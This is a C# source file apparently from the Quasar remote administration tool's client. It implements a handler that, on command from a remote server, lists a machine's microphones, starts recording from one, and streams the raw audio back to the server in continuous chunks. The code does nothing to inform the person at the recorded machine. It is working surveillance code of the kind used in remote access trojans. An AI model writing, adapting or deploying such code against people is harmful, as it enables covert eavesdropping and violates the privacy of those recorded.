using NAudio.Wave;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;

namespace Quasar.Client.Messages
{
    public class AudioCaptureHandler : NotificationMessageProcessor, IDisposable
    {
        private WaveInEvent _waveIn;
        private ISender _client;
        private int _deviceIndex;
        private int _sampleRate;
        private int _channels;
        private int _bitsPerSample;

        public override bool CanExecute(IMessage message) => message is GetAudioDevices ||
                                                              message is GetAudioCapture ||
                                                              message is DoAudioCaptureStop;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetAudioDevices msg:
                    Execute(sender, msg);
                    break;
                case GetAudioCapture msg:
                    Execute(sender, msg);
                    break;
                case DoAudioCaptureStop msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetAudioDevices message)
        {
            try
            {
                int deviceCount = WaveIn.DeviceCount;
                string[] deviceNames = new string[deviceCount];
                for (int i = 0; i < deviceCount; i++)
                {
                    var capabilities = WaveIn.GetCapabilities(i);
                    deviceNames[i] = capabilities.ProductName;
                }
                client.Send(new GetAudioDevicesResponse { DeviceNames = deviceNames });
            }
            catch (Exception)
            {
                client.Send(new GetAudioDevicesResponse { DeviceNames = new string[0] });
            }
        }

        private void Execute(ISender client, GetAudioCapture message)
        {
            try
            {
                if (message.CreateNew)
                {
                    StopCapture();

                    _client = client;
                    _deviceIndex = message.DeviceIndex;
                    _sampleRate = message.SampleRate;
                    _channels = message.Channels;
                    _bitsPerSample = message.BitsPerSample;

                    _waveIn = new WaveInEvent
                    {
                        DeviceNumber = _deviceIndex,
                        WaveFormat = new WaveFormat(_sampleRate, _bitsPerSample, _channels),
                        BufferMilliseconds = 100
                    };

                    _waveIn.DataAvailable += WaveIn_DataAvailable;
                    _waveIn.RecordingStopped += WaveIn_RecordingStopped;
                    _waveIn.StartRecording();

                    OnReport("Audio capture session started");
                }
            }
            catch (Exception)
            {
                StopCapture();
            }
        }

        private void Execute(ISender client, DoAudioCaptureStop message)
        {
            StopCapture();
            OnReport("Audio capture session stopped");
        }

        private void WaveIn_DataAvailable(object sender, WaveInEventArgs e)
        {
            try
            {
                if (_client != null && e.BytesRecorded > 0)
                {
                    byte[] audioData = new byte[e.BytesRecorded];
                    Array.Copy(e.Buffer, audioData, e.BytesRecorded);

                    _client.Send(new GetAudioCaptureResponse
                    {
                        Audio = audioData,
                        SampleRate = _sampleRate,
                        Channels = _channels,
                        BitsPerSample = _bitsPerSample,
                        DeviceIndex = _deviceIndex
                    });
                }
            }
            catch (Exception)
            {
                StopCapture();
            }
        }

        private void WaveIn_RecordingStopped(object sender, StoppedEventArgs e)
        {
            // Recording was stopped externally or due to an error
        }

        private void StopCapture()
        {
            if (_waveIn != null)
            {
                try
                {
                    _waveIn.DataAvailable -= WaveIn_DataAvailable;
                    _waveIn.RecordingStopped -= WaveIn_RecordingStopped;
                    _waveIn.StopRecording();
                }
                catch
                {
                }
                finally
                {
                    _waveIn.Dispose();
                    _waveIn = null;
                }
            }
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                StopCapture();
            }
        }
    }
}
